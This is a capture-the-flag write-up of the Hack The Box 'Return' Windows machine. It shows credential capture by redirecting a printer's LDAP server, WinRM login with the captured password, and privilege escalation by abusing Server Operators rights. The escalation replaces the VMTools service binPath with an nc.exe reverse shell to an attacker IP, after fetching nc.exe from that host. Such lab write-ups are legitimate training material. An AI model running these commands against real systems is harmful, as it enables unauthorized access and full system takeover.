---
title: "[HTB] Return Writeup"
date: 2026-05-21 14:25:00 +0900
author: aestera
categories: [HTB, Writeup]
tags: [Windows, AD]
description: HTB Return write-up
math: true
image: https://htb-mp-prod-public-storage.s3.eu-central-1.amazonaws.com/avatars/defa149ea7e259a4709a03a5825e970d.png
---

## TL;DR

Changing the printer server address to the **attacker IP** caused the target to authenticate back and expose the `svc-printer` credentials. Using `svc-printer` over WinRM, the Server Operators membership allowed abusing writable service configuration. The **VMTools** service binPath was replaced with `nc.exe`, and restarting the service spawned a **SYSTEM** shell.


---

## 1. Recon

Nmap scan result showed that the target was a Windows host exposing web, SMB, LDAP, Kerberos, and WinRM-related services. The presence of AD related ports indicated that the machine was likely part of an Active Directory environment.

**port scan result**
![2026-05-16-16-13-23](https://pub-c64d7608f6724ae48e3b199d196d7dcd.r2.dev/obsidian/2026/05/16/2026-05-16-16-13-23-1778915606294.png)


---

## 2. Initial Access - Printer Configuration Credential Capture
The web application exposed a printer settings page.

```
http://10.129.95.241/settings.php
```

![2026-05-16-17-13-39](https://pub-c64d7608f6724ae48e3b199d196d7dcd.r2.dev/obsidian/2026/05/16/2026-05-16-17-13-39-1778919222531.png)
![2026-05-16-17-14-05](https://pub-c64d7608f6724ae48e3b199d196d7dcd.r2.dev/obsidian/2026/05/16/2026-05-16-17-14-05-1778919248400.png)

The settings page contained LDAP connection information used by the printer service.
The LDAP server address was modified to the attacker IP.

After saving the configuration, the target attempted to connect back to the attacker machine on port 389. During this connection, the configured credentials were sent to the attacker listener.

The following credential was recovered.

```
svc-printer:1edFg43012!!
```

The recovered credential was then used to authenticate to the target through **WinRM**.

```bash
└─$ evil-winrm -i 10.129.95.241 -u 'svc-printer' -p '1edFg43012!!'
```

![2026-05-16-17-35-14](https://pub-c64d7608f6724ae48e3b199d196d7dcd.r2.dev/obsidian/2026/05/16/2026-05-16-17-35-14-1778920520323.png)

---


## 3. Privilege Escalation - Server Operators to SYSTEM via Service Configuration Abuse

```powershell
*Evil-WinRM* PS C:\Users\svc-printer\Documents> net user svc-printer
```

![2026-05-16-18-10-53](https://pub-c64d7608f6724ae48e3b199d196d7dcd.r2.dev/obsidian/2026/05/16/2026-05-16-18-10-53-1778922655613.png)

The `svc-printer` account was a member of the **Server Operators group**.

This was important because **Server Operators** can perform administrative server-management tasks. In this case, the account had enough privileges to modify service configurations.

The Evil-WinRM services command was used to identify services that the current user could modify.

```powershell
*Evil-WinRM* PS C:\Users\svc-printer\Documents> services
```

![2026-05-17-00-37-56](https://pub-c64d7608f6724ae48e3b199d196d7dcd.r2.dev/obsidian/2026/05/17/2026-05-17-00-37-56-1778945879619.png)

The output showed that the **VMTools** service had `Privileges=True`

```
Path                                                    Privileges  Service
----                                                    ----------  -------
"C:\Program Files\VMware\VMware Tools\vmtoolsd.exe"      True        VMTools
```

This indicated that the current user could modify the **VMTools** service configuration.

Since Windows services often run with high privileges, **VMTools** was selected as the privilege escalation target. The service execution path could be replaced with a reverse shell command.

First, `nc.exe` was downloaded to the target.

```powershell
*Evil-WinRM* PS C:\Users\svc-printer\Documents> Invoke-WebRequest -Uri http://10.10.14.37/nc.exe -Outfile C:\Users\svc-printer\Documents\nc.exe
```

Then the VMTools service binPath was changed to execute `nc.exe.`

```powershell
*Evil-WinRM* PS C:\Users\svc-printer\Documents> sc.exe config VMTools binPath= "C:\Users\svc-printer\Documents\nc.exe -e cmd.exe 10.10.14.37 80"
[SC] ChangeServiceConfig SUCCESS
```

This changed the command executed when the **VMTools** service starts.

On the attacker machine, a Netcat listener was started.

```bash
nc -lvnp 80
```

The **VMTools** service was then stopped and started.

```powershell
*Evil-WinRM* PS C:\Users\svc-printer\Documents> sc.exe stop VMTools

SERVICE_NAME: VMTools
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 1  STOPPED
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0
*Evil-WinRM* PS C:\Users\svc-printer\Documents> sc.exe start VMTools
```

![2026-05-17-00-52-22](https://pub-c64d7608f6724ae48e3b199d196d7dcd.r2.dev/obsidian/2026/05/17/2026-05-17-00-52-22-1778946746755.png)
After the service was started, the target connected back to the listener.

```bash
└─$ nc -lvnp 80
listening on [any] 80 ...
connect to [10.10.14.37] from (UNKNOWN) [10.129.95.241] 55299
Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami && ipconfig && type \Users\Administrator\Desktop\root.txt
```

![2026-05-17-00-57-16](https://pub-c64d7608f6724ae48e3b199d196d7dcd.r2.dev/obsidian/2026/05/17/2026-05-17-00-57-16-1778947038739.png)